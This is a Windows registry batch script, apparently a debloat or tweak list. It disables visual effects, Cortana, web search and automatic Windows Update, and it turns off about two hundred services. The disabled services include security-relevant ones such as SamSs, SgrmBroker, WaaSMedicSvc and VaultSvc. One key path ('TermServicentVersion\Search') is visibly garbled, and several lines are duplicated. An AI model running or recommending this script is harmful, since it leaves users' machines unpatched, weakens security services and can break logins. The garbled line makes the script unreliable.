reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon" /v "DefaultApplied" /t REG_SZ /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v "DownloadMode" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization" /v "SystemSettingsDownloadMode" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpgrade" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpgradePeriod" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpdatePeriod" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate" /v "AutoDownload" /t REG_DWORD /d "2" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWebOverMeteredConnections" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TermServicentVersion\Search" /v "AllowCortana" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_SZ /d "00000000" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AarSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AJRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ALG" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppIDSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Appinfo" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppReadiness" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppVClient" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppXSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AssignedAccessManagerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AudioEndpointBuilder" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Audiosrv" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\autotimesvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AxInstSV" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BcastDVRUserService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BFE" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BITS" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BluetoothUserService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BrokerInfrastructure" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BTAGService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BthAvctpSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthserv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\camsvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CaptureService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\cbdhsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CDPSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CertPropSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ClipSVC" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CoreMessagingRegistrar" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CredentialEnrollmentManagerUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CscService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DcomLaunch" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\defragsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceAssociationBrokerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceAssociationService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceInstall" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicePickerUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicesFlowUserSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevQueryBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dhcp" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DispBrokerDesktopSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DisplayEnhancementService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DmEnrollmentSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DoSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dot3svc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DsmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DsSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DusmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Eaphost" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EFS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\embeddedmode" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EntAppSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventSystem" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\fdPHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FDResPub" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\fhsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FrameServer" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gpsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\GraphicsPerfSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\hidserv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\HvHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\icssvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\IKEEXT" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\InstallService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\iphlpsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\IpxlatCfgSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\KeyIso" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\KtmRm" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lfsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LicenseManager" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lltdsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lmhosts" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LSM" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LxpSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MessagingService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\mpssvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSDTC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSiSCSI" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\msiserver" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NaturalAuthentication" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcaSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcbService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcdAutoSetup" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netman" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\netprofm" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetSetupSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetTcpPortSharing" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NgcCtnrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NgcSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nsi" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2pimsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2psvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PeerDistSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PerfHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PhoneSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\pla" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PlugPlay" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PNRPAutoReg" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PNRPsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PolicyAgent" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Power" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PrintWorkflowUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ProfSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PushToInstall" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\QWAVE" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasAuto" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasMan" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RemoteAccess" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RpcSs" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SamSs" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SCardSvr" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ScDeviceEnum" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Schedule" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SCPolicySvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SDRSVC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\seclogon" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SEMgrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SENS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorDataService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SessionEnv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ShellHWDetection" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\shpamsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\smphost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SmsRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SNMPTRAP" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\sppsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SSDPSRV" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ssh-agent" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SstpSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StateRepository" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StorSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\svsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\swprv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SystemEventsBroker" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TapiSrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Themes" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TieringEngineService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TokenBroker" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrkWks" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TroubleshootingSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrustedInstaller" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\tzautoupdate" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UdkUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UevAgentService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UnistoreSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\upnphost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UserManager" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VaultSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vds" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VSS" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WalletService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WarpJITSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wbengine" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WbioSrvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wcmsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wcncsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WebClient" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wecsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WEPHOSTSVC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wercplsupport" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WFDSConMgrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WiaRpc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Winmgmt" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinRM" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WlanSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wlidsvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wlpasvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WManSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wmiApSrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WpcMonSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WPDBusEnum" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WSearch" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WwanSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d 0 /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchPrivacy" /t REG_DWORD /d 3 /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d 0 /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWebOverMeteredConnections" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d 1 /f 
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Experience\AllowCortana" /v "value" /t REG_DWORD /d 0 /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d 0 /f 
